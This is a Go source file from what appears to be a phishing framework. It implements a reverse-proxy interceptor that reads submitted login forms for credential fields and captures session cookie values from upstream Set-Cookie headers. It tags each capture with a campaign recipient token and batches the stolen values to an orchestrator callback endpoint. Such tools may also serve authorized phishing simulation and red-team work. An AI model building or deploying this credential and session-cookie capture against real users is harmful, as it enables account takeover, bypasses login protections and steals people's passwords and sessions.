// Package engineproxy — capture pipeline: inspects proxied requests and
// responses against configured rules and reports matched events to the
// orchestrator callback. Events are queued in a bounded in-memory buffer
// with drop-oldest semantics and delivered in batches with retry.
package engineproxy

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync/atomic"
	"time"

	"phishforge/internal/engineconfig"
)

// Event kinds reported to the orchestrator.
const (
	KindCreds   = "creds"
	KindSession = "session"
)

// Event is one capture match. Token attributes it to a campaign recipient.
type Event struct {
	EngineID string         `json:"engine_id"`
	Token    string         `json:"recipient_token"`
	Kind     string         `json:"kind"`
	Payload  map[string]any `json:"payload"`
	TS       time.Time      `json:"ts"`
}

// Reporter delivers events to the orchestrator callback endpoint.
// A nil Reporter is valid: interception is disabled.
type Reporter struct {
	callbackURL string
	token       string
	client      *http.Client
	queue       chan Event
	dropped     atomic.Int64
	enqueued    atomic.Int64
}

const (
	defaultQueueSize = 1024
	batchSize        = 50
	batchFlushEvery  = 500 * time.Millisecond
	maxPostAttempts  = 3
)

// NewReporter returns a Reporter, or nil when callbackURL is empty
// (engine runs without event reporting).
func NewReporter(callbackURL, token string, queueSize int) *Reporter {
	if callbackURL == "" {
		return nil
	}
	if queueSize < 0 {
		queueSize = defaultQueueSize
	}
	return &Reporter{
		callbackURL: callbackURL,
		token:       token,
		client:      &http.Client{Timeout: 10 * time.Second},
		queue:       make(chan Event, queueSize),
	}
}

// Enqueue adds e without blocking; when the queue is full the event is
// dropped and the drop counter incremented.
func (r *Reporter) Enqueue(e Event) {
	if r == nil {
		return
	}
	select {
	case r.queue <- e:
		r.enqueued.Add(1)
	default:
		r.dropped.Add(1)
	}
}

// Dropped returns the number of events dropped due to a full queue.
func (r *Reporter) Dropped() int64 {
	if r == nil {
		return 0
	}
	return r.dropped.Load()
}

// Run drains the queue in batches until ctx is cancelled.
func (r *Reporter) Run(ctx context.Context) {
	if r == nil {
		return
	}
	batch := make([]Event, 0, batchSize)
	flush := func() {
		if len(batch) == 0 {
			return
		}
		if !r.post(ctx, batch) {
			r.dropped.Add(int64(len(batch)))
		}
		batch = batch[:0]
	}
	tick := time.NewTicker(batchFlushEvery)
	defer tick.Stop()
	for {
		select {
		case <-ctx.Done():
			flush()
			return
		case e := <-r.queue:
			batch = append(batch, e)
			if len(batch) >= batchSize {
				flush()
			}
		case <-tick.C:
			flush()
		}
	}
}

// post delivers one batch with bounded retries; true on any 2xx.
func (r *Reporter) post(ctx context.Context, batch []Event) bool {
	body, err := json.Marshal(map[string]any{"events": batch})
	if err != nil {
		return false
	}
	backoff := 200 * time.Millisecond
	for attempt := 0; attempt < maxPostAttempts; attempt++ {
		if attempt > 0 {
			select {
			case <-ctx.Done():
				return false
			case <-time.After(backoff):
				backoff *= 2
			}
		}
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, r.callbackURL, bytes.NewReader(body))
		if err != nil {
			return false
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer "+r.token)
		resp, err := r.client.Do(req)
		if err != nil {
			continue
		}
		_ = resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			return true
		}
	}
	return false
}

// Enqueued returns the number of events accepted into the queue.
func (r *Reporter) Enqueued() int64 {
	if r == nil {
		return 0
	}
	return r.enqueued.Load()
}

// Interceptor applies capture rules to proxied traffic.
type Interceptor struct {
	cfg          engineconfig.Capture
	engineID     string
	reporter     *Reporter
	credFields   map[string]struct{}
	sessionCooks map[string]struct{}
}

// NewInterceptor builds the interceptor from validated config. Returns nil
// when the config has no capture section (no interception at all).
func NewInterceptor(cfg engineconfig.Config, engineID string, reporter *Reporter) *Interceptor {
	if cfg.Capture == nil {
		return nil
	}
	c := cfg.Capture
	ic := &Interceptor{
		cfg:          *c,
		engineID:     engineID,
		reporter:     reporter,
		credFields:   make(map[string]struct{}, len(c.CredentialFormFields)),
		sessionCooks: make(map[string]struct{}, len(c.SessionCookies)),
	}
	if ic.cfg.MaxBodyBytes <= 0 {
		ic.cfg.MaxBodyBytes = 65536
	}
	if ic.cfg.TokenQueryKey == "" {
		ic.cfg.TokenQueryKey = "_pft"
	}
	for _, f := range c.CredentialFormFields {
		ic.credFields[strings.ToLower(f)] = struct{}{}
	}
	for _, s := range c.SessionCookies {
		ic.sessionCooks[s] = struct{}{}
	}
	return ic
}

// RequestMiddleware wraps the proxy handler: on POST requests it inspects the
// (bounded) body for credential field names, emits a creds event on a match,
// and restores the body so the proxy forwards it unchanged. The recipient
// token query parameter is extracted and stripped before forwarding.
func (i *Interceptor) RequestMiddleware(next http.Handler) http.Handler {
	if i == nil {
		return next
	}
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		token := i.takeToken(r)
		if i.reporter != nil && r.Method == http.MethodPost && len(i.credFields) > 0 && i.actionMatches(r.URL.Path) {
			body, err := io.ReadAll(io.LimitReader(r.Body, i.cfg.MaxBodyBytes))
			if err == nil && len(body) > 0 {
				fields := parseBodyFields(body, r.Header.Get("Content-Type"))
				hits := map[string]string{}
				for name, val := range fields {
					if _, ok := i.credFields[name]; ok {
						hits[name] = val
					}
				}
				if len(hits) > 0 {
					i.reporter.Enqueue(Event{
						EngineID: i.engineID, Token: token, Kind: KindCreds,
						Payload: map[string]any{"fields": hits, "path": r.URL.Path},
						TS:      time.Now().UTC(),
					})
				}
				r.Body = io.NopCloser(bytes.NewReader(body))
			}
		}
		next.ServeHTTP(w, r)
	})
}

// takeToken extracts and strips the configured token query parameter.
func (i *Interceptor) takeToken(r *http.Request) string {
	q := r.URL.Query()
	key := i.cfg.TokenQueryKey
	tok := q.Get(key)
	if tok != "" {
		q.Del(key)
		r.URL.RawQuery = q.Encode()
	}
	return tok
}

func (i *Interceptor) actionMatches(path string) bool {
	return i.cfg.FormActionContains == "" || strings.Contains(path, i.cfg.FormActionContains)
}

// InspectResponse scans upstream Set-Cookie headers for configured session
// cookie names and reports a session event per match.
func (i *Interceptor) InspectResponse(resp *http.Response) {
	if i == nil || i.reporter == nil || len(i.sessionCooks) == 0 {
		return
	}
	for _, sc := range resp.Header.Values("Set-Cookie") {
		name, value, ok := splitCookie(sc)
		if !ok {
			continue
		}
		if _, hit := i.sessionCooks[name]; hit {
			i.reporter.Enqueue(Event{
				EngineID: i.engineID, Kind: KindSession,
				Payload: map[string]any{"cookie": name, "value": value},
				TS:      time.Now().UTC(),
			})
		}
	}
}

func splitCookie(sc string) (name, value string, ok bool) {
	parts := strings.SplitN(sc, "=", 2)
	if len(parts) != 2 {
		return "", "", false
	}
	name = strings.TrimSpace(parts[0])
	rest := parts[1]
	if idx := strings.IndexByte(rest, ';'); idx >= 0 {
		rest = rest[:idx]
	}
	return name, strings.TrimSpace(rest), name != ""
}

// parseBodyFields extracts a flat name→value map from urlencoded or JSON bodies.
func parseBodyFields(body []byte, contentType string) map[string]string {
	out := map[string]string{}
	ct := strings.ToLower(strings.TrimSpace(contentType))
	switch {
	case strings.HasPrefix(ct, "application/x-www-form-urlencoded"):
		if vals, err := url.ParseQuery(string(body)); err == nil {
			for k, v := range vals {
				if len(v) > 0 {
					out[strings.ToLower(k)] = v[0]
				}
			}
		}
	case strings.HasPrefix(ct, "application/json"):
		var m map[string]any
		if err := json.Unmarshal(body, &m); err == nil {
			for k, v := range m {
				switch t := v.(type) {
				case string:
					out[strings.ToLower(k)] = t
				case float64:
					out[strings.ToLower(k)] = strings.TrimRight(strings.TrimRight(
						fmtNumber(t), "0"), ".")
				}
			}
		}
	}
	return out
}

func fmtNumber(f float64) string {
	b, _ := json.Marshal(f)
	return string(b)
}